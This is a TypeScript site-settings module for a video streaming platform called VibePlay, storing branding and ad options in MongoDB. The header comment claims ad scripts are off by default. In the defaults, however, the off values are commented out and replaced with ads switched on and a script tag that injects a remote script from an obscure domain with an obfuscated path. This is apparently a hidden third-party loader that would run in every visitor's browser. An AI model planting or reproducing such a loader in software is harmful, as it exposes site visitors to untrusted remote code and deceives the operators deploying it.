import { getCollections, isMongoConfigured } from "@/db";

/**
 * Typed key/value site settings stored in MongoDB (`site_settings`).
 * Advertisement scripts are disabled by default and only rendered when enabled.
 */

export interface SiteSettings {
  siteName: string;
  siteTagline: string;
  siteDescription: string;
  contactEmail: string;
  logoUrl: string;
  socialTwitter: string;
  socialYoutube: string;
  socialInstagram: string;
  ageGateEnabled: boolean;
  adsEnabled: boolean;
  adHomeHtml: string;
  adListHtml: string;
  adWatchHtml: string;
}

const DEFAULTS: SiteSettings = {
  siteName: "VibePlay",
  siteTagline: "Stream the vibe.",
  siteDescription:
    "VibePlay is a premium video streaming platform for creators and their audiences.",
  contactEmail: "contact@vibeplay.example",
  logoUrl: "",
  socialTwitter: "",
  socialYoutube: "",
  socialInstagram: "",
  ageGateEnabled: false,
  // adsEnabled: false,
  // adHomeHtml: "",
  // adListHtml: "",
  // adWatchHtml: "",
  adsEnabled: true,
adHomeHtml: `<script>
(function(ribka){
var d = document,
    s = d.createElement('script'),
    l = d.currentScript || d.scripts[d.scripts.length - 1];
s.settings = ribka || {};
s.src = "\/\/quarrelsomebitter.com\/b\/X.VSsadfGXlW0BY\/Wacw\/aeLmD9ruAZCUplikVPSTzc\/1\/M\/jnIJxQOCDNUytkNwz-UuyQMvjAEH4IOwQx";
s.async = true;
s.referrerPolicy = 'no-referrer-when-downgrade';
l.parentNode.insertBefore(s, l);
})({})
</script>`,
adListHtml: ``,
adWatchHtml: ``,  
};

const KEYS: Record<keyof SiteSettings, string> = {
  siteName: "site_name",
  siteTagline: "site_tagline",
  siteDescription: "site_description",
  contactEmail: "contact_email",
  logoUrl: "logo_url",
  socialTwitter: "social_twitter",
  socialYoutube: "social_youtube",
  socialInstagram: "social_instagram",
  ageGateEnabled: "age_gate_enabled",
  adsEnabled: "ads_enabled",
  adHomeHtml: "ad_home_html",
  adListHtml: "ad_list_html",
  adWatchHtml: "ad_watch_html",
};

function coerce(key: keyof SiteSettings, raw: string | null | undefined): string | boolean {
  if (key === "ageGateEnabled" || key === "adsEnabled") return raw === "1";
  const value = raw ?? "";
  return value === "" ? (DEFAULTS[key] as string) : value;
}

export async function getSettings(): Promise<SiteSettings> {
  const result: SiteSettings = { ...DEFAULTS };
  if (!isMongoConfigured()) return result;

  try {
    const { siteSettings } = await getCollections();
    const docs = await siteSettings.find({}).toArray();
    for (const doc of docs) {
      const entry = Object.entries(KEYS).find(([, dbKey]) => dbKey === doc._id) as
        | [keyof SiteSettings, string]
        | undefined;
      if (entry) {
        const [settingKey] = entry;
        Object.assign(result, { [settingKey]: coerce(settingKey, doc.value) });
      }
    }
  } catch {
    // Database unreachable — return defaults so layout/branding stays resilient.
  }
  return result;
}

export async function updateSettings(patch: Partial<SiteSettings>): Promise<void> {
  const { siteSettings } = await getCollections();
  const entries = Object.entries(patch).filter(([key]) => key in KEYS) as Array<
    [keyof SiteSettings, SiteSettings[keyof SiteSettings]]
  >;
  if (entries.length === 0) return;

  const now = new Date();
  await siteSettings.bulkWrite(
    entries.map(([key, value]) => {
      const dbKey = KEYS[key];
      const serialized = typeof value === "boolean" ? (value ? "1" : "0") : String(value ?? "");
      return {
        updateOne: {
          filter: { _id: dbKey },
          update: { $set: { value: serialized, updatedAt: now } },
          upsert: true,
        },
      };
    }),
  );
}

/** Subset safe to expose to visitors through the public API. */
export function getPublicSettings(settings: SiteSettings) {
  return {
    siteName: settings.siteName,
    siteTagline: settings.siteTagline,
    siteDescription: settings.siteDescription,
    contactEmail: settings.contactEmail,
    social: {
      twitter: settings.socialTwitter,
      youtube: settings.socialYoutube,
      instagram: settings.socialInstagram,
    },
    ageGateEnabled: settings.ageGateEnabled,
    adsEnabled: settings.adsEnabled,
  };
}

export async function deleteSetting(key: string): Promise<void> {
  const { siteSettings } = await getCollections();
  await siteSettings.deleteOne({ _id: key });
}
